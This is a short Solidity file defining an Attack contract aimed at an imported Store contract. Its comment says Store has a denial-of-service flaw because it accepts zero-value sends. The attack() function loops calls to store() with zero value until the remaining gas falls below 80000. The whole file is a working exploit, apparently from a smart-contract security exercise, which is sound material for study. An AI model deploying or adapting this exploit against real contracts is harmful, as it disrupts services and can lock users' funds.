// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./Store.sol";

//@notice The Store contract has a DoS vulnerability without checking that amount send is not 0
contract Attack is Ownable {
    address storeContract;

    constructor(address _storeContract) {
        storeContract = _storeContract;
    }

    receive() external payable {}

    function attack() public onlyOwner {
        do {
            (bool success, ) =
            storeContract.call{value: 0}(abi.encodeWithSignature("store()"));
            require(success, "Attack failed");
        } while (gasleft() > 80000);
    }

}
